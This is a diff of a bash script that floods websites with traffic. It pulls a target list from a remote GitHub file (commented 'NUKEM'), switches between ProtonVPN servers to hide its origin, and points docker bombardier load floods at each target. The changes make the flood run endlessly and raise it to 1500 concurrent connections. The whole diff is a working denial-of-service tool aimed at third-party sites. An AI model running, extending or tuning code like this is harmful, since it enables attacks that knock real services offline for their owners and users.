@@ -19,8 +19,6 @@ BACKUP_SUFFIX=$(date +"%F_%H%M") # log retention suffix
 # NUKEM
 TARG_URL="curl https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
 
-NUM_RUNS=$1
-
 # yes, Im still relying on this for free tier and server switching via cli
 PROTONVPN_PATH="$(which protonvpn-cli)"
 PROTONVPN_SERVERS=("JP-FREE#1"
@@ -119,9 +117,8 @@ kill_stale
 rotate_file "${LOG_PATH}" $LOG_RETENTION "logs"
 echo -e "==== START $(date +"%F %H:%M") ====\n" | tee -a $LOG_PATH
 echo -e "$(date +"%F %H:%M") DEBUG: TIME_EACH=${TIME_EACH}s" | tee -a $LOG_PATH
-echo -e "$(date +"%F %H:%M") DEBUG: NUM_RUNS=$NUM_RUNS\n" | tee -a $LOG_PATH
 
-for run in $(seq 1 $NUM_RUNS); do
+while :; do
     echo -e "$(date +"%F %H:%M") INFO: BEGIN RUN $run" | tee -a $LOG_PATH
     echo -e "$(date +"%F %H:%M") INFO: RE-READ TARGETS" | tee -a $LOG_PATH
     TARGETS=()
@@ -135,7 +132,7 @@ for run in $(seq 1 $NUM_RUNS); do
     if [ -n "$PROTONVPN_PATH" ]; then switch_server_pvpn $(($run-1)); fi
     for ran_targ in $(shuf -i 0-$(($NUM_TARGETS-1))); do
         echo -e "$(date +"%F %H:%M") INFO: RUN $run TARGET ${TARGETS[$ran_targ]}" | tee -a $LOG_PATH
-        docker run -d --rm alpine/bombardier -c 1000 -d ${TIME_EACH}s -l ${TARGETS[$ran_targ]} | tee -a $LOG_PATH
+        docker run -d --rm alpine/bombardier -c 1500 -d ${TIME_EACH}s -l ${TARGETS[$ran_targ]} | tee -a $LOG_PATH
         sleep ${TIME_EACH}s
         kill_stale
     done
